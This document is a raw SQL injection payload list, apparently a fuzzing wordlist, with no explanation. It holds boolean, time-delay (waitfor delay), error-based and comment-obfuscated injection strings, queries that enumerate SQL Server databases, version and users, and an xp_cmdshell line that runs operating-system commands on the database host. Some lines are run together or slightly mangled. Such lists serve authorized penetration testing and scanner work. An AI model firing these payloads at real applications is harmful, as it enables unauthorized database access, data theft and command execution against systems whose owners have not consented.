‘
’ OR
5=5 OR ‘s’=’0
’ AND 5=5 OR ‘s’=’0
’ OR 5=0 OR ‘s’=’0
’ AND 5=0 OR ‘s’=’0
0+1
0+
AND 5=5
AND 5=0
OR 5=5 OR 4=0
OR 5=0 OR 4=0
‘ OR ‘1’=’1
1” AND “1”=”1
1” AND “1”=”2
1” OR “1”=”1
1,’0’,’0’,’0’,’0’);
waitfor delay ‘0:0:15’;--
1 AND 1=1
1 AND 1=2
1 OR 1=1
‘ AND ‘1’=’1
‘ AND ‘1’=’2
"'"
'"'
'''''
""""""
"""""""''''''
1,’0’);waitfor delay ‘0:0:15’;--
1’,’0’,’0’);waitfor delay ‘0:0:15’;--
1,’0’,’0’);waitfor delay ‘0:0:15’;--
1’,’0’,’0’,’0’);waitfor delay ‘0:0:15’;--
1,’0’,’0’,’0’);waitfor delay ‘0:0:15’;--
1’,’0’,’0’,’0’,’0’); waitfor delay ‘0:0:15’;--
‘;waitfor delay ‘0:0:15’;--
;waitfor delay ‘0:0:15’;--
‘);waitfor delay ‘0:0:15’;--
);waitfor delay ‘0:0:15’;--
1’,’0’);waitfor delay ‘0:0:15’;--
’ AND ‘1’=’1
’ AND ‘1’=’0
’+’s’+’
’||’s’||’ 1+1 1’+1+’0
1 value/**/ value/*!a*/
’/**/’
’/*!a*/’
AND 1=1 value AND 1=0
%27 %2527 “
%22
&'
'&
"""&
convert(varchar,0x7b5d)
convert(int,convert (varchar,0x7b5d))
‘+convert (varchar,0x7b5d)+’
‘+convert(int,convert (varchar,0x7b5d))+’
‘ having 1=1-- 1 having 1=1-- \’ having 1=1--
) having 1=1--
%a5’ having 1=1--
vol ‘ | ‘vol “ | “vol ||vol ‘ + ‘‘ + ‘
or 7659=7659
and 7659=7659
and 0=7659
/**/or/**/ 7659=7659
/**/and/**/ 7659=7659
/**/and/** /0=7659
‘;
\’
;
\”
“‘
“
‘ exec master.. xp_cmdshell ‘vol’--
‘; select * from dbo. sysdatabases--
‘; select @@ version,1,1,1--
‘; select * from master..sysmessages--
‘; select * from sys.dba_users--
a' and '456'='678
a' or '345'='345
a' and 'fghi'='fghj'-- #
a' or 'dfth'='dfth'-- #
a' order by 9999-- #
a' order by 1-- #
a'and/*g*/456=678-- #
a'or/*g*/345=345-- #
